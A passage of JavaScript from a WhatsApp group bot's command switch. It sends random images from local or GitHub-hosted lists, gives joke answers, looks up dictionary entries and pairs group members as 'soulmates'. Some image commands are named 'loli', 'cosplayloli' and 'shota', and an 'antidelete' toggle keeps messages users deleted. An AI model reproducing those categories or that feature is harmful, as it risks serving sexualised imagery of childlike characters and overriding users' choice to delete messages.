await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/bike.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/boneka.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cat.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/doggo.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/justina.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kayes.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kpop.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/notnot.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/car.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'couplepp': case 'ppcouple': {
let anu = require('./src/media/randompics/ppcouple.json')
let random = anu[Math.floor(Math.random() * anu.length)]
PrexzyVilla.sendMessage(from, { image: { url: random.male }, caption: `Couple pp for male` }, { quoted: m })
PrexzyVilla.sendMessage(from, { image: { url: random.female }, caption: `Couple pp for female` }, { quoted: m })
}
break
case 'profilepic':  case 'profilepicture':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/profile.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/pubg.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/rose.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallml.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
            case 'remini': {
			if (!quoted) return replygcprexzy(`Where is the picture?`)
			if (!/image/.test(mime)) return replygcprexzy(`Send/Reply Photos With Captions ${prefix + command}`)
			await PrexzyStickWait()
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			PrexzyVilla.sendMessage(m.chat, { image: proses, caption: mess.success}, { quoted: m})
			}
			break
			case 'define': {
    if (!text) return replygcprexzy(`📖 *Usage:* ${prefix + command} [word]\n\n📌 *Example:* ${prefix + command} computer`);

    try {
        replygcprexzy('🔍 *Searching for definition...*');

        const apiUrl = `https://api.dictionaryapi.dev/api/v2/entries/en/${encodeURIComponent(text)}`;
        const response = await fetch(apiUrl);
        const data = await response.json();

        if (!data || !data[0]) {
            return replygcprexzy(`❌ *No definition found for:* ${text}`);
        }

        let wordInfo = data[0];
        let word = wordInfo.word;
        let phonetics = wordInfo.phonetics.length ? `🔊 *Pronunciation:* ${wordInfo.phonetics[0].text || 'N/A'}` : '';
        let meanings = wordInfo.meanings.map((meaning, i) => 
            `📌 *Meaning ${i + 1}:*\n• *Part of Speech:* ${meaning.partOfSpeech}\n• *Definition:* ${meaning.definitions[0].definition}\n• *Example:* ${meaning.definitions[0].example || 'No example available'}`
        ).join("\n\n");

        let dictionaryMessage = `📖 *Dictionary Definition*\n\n📝 *Word:* ${word}\n${phonetics}\n\n${meanings}\n\n✅ *DONE BY QUEEN NYX 👑*`;

        PrexzyVilla.sendMessage(m.chat, { text: dictionaryMessage }, { quoted: m });

    } catch (error) {
        console.error(error);
        replygcprexzy(`❌ *Error fetching definition. Please try again later.*\n\nDONE BY QUEEN NYX 👑`);
    }
}
break
case 'spnquote': 
case 'supernatural': {
    try {
        replygcprexzy('🔍 *Fetching a Supernatural quote...*');

        const apiUrl = `https://supernatural-quotes-api.cyclic.app`;
        const response = await fetch(apiUrl);
        const data = await response.json();

        if (!data || !data.quote || !data.author) {
            return replygcprexzy(`❌ *Failed to fetch a quote. Please try again later.*`);
        }

        let quoteMessage = `🔥 *Supernatural Quote*\n\n`;
        quoteMessage += `📜 *Quote:* "${data.quote}"\n`;
        quoteMessage += `📝 *Author:* ${data.author}\n\n`;
        quoteMessage += `✅ *DONE BY QUEEN NYX 👑*`;

        PrexzyVilla.sendMessage(m.chat, { text: quoteMessage }, { quoted: m });

    } catch (error) {
        console.error(error);
        replygcprexzy(`❌ *Error fetching quote. Please try again later.*\n\nDONE BY QUEEN NYX 👑`);
    }
}
break
                case 'can': {
            	if (!text) return replygcprexzy(`Ask question\n\nExample : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Can ${text}*\nAnswer : ${keh}`
            await replygcprexzy(jawab)
            }
            break
            case 'is': {
            	if (!text) return replygcprexzy(`Ask question\n\nExample : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
            await replygcprexzy(jawab)
            }
            break
            case 'when': {
            	if (!text) return replygcprexzy(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
            await replygcprexzy(jawab)
            }
            break
case 'what': {
            	if (!text) return replygcprexzy(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`                
            await replygcprexzy(jawab)
            }
            break
case 'where': {
if (!text) return replygcprexzy(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            await replygcprexzy(jawab)
            }
            break
            case 'antidelete': {
    if (!isAdmin && !m.isGroup) return replygcprexzy('❌ Only group admins can enable this in groups, but you can enable it in private chat.');

    global.antidelete = !global.antidelete;
    replygcprexzy(`✅ *Anti-Delete is now ${global.antidelete ? 'Activated' : 'Deactivated'}!*\n\nDONE BY QUEEN NYX 👑`);
}
break
case 'how': {
            	if (!text) return replygcprexzy(`Ask question\n\nExample : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`                
            await replygcprexzy(jawab)
            }
            break
case 'rate': {
            	if (!text) return replygcprexzy(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
            await replygcprexzy(jawab)
            }
            break
            case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                replygcprexzy(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const prexzykak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
PrexzyVilla.sendMessage(m.chat, { text: prexzykak }, { quoted: m })
break
            case 'soulmate': {
            if (!m.isGroup) return PrexzyStickgroup()
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
PrexzyVilla.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./PrexzyMedia/theme/nyxpic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return PrexzyStickgroup()
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
PrexzyVilla.sendMessage(m.chat,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖👀`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./PrexzyMedia/theme/nyxpic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
                        case 'coffee': case 'kopi': {
                PrexzyVilla.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) return replygcprexzy('Enter Query Title')
                await PrexzyStickWait()
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]                
                PrexzyVilla.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) return replygcprexzy('Enter Query Title')
                await PrexzyStickWait()
		let { wikimedia } = require('./lib/scraper')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                PrexzyVilla.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
            }
            break
            
            case 'random': {
            let type = (command).toLowerCase()
  let baseUrl = 'https://weeb-api.vercel.app/'
  const fetchImage = async (endpoint) => {
    try {
      const response = await fetch(baseUrl + endpoint)
      if (!response.ok) return replygcprexzy(`Error fetching ${type} image`)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      PrexzyVilla.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${type}`}, {quoted: m})
    } catch (error) {
      console.error(error)
      replygcprexzy(`An error occurred while fetching the ${type} image. Please use the command properly \nExample: ${prefix + command} loli\n`)
    }
  }
  switch (type) {
    case 'loli':
      fetchImage('loli')
      break
    case 'waifu':
      fetchImage('waifu')
      break
    case 'neko':
      fetchImage('neko')
      break
    case 'zerotwo':
      fetchImage('zerotwo')
      break
    default:    
      break
  }
  }
  break
            case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
await PrexzyStickWait()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
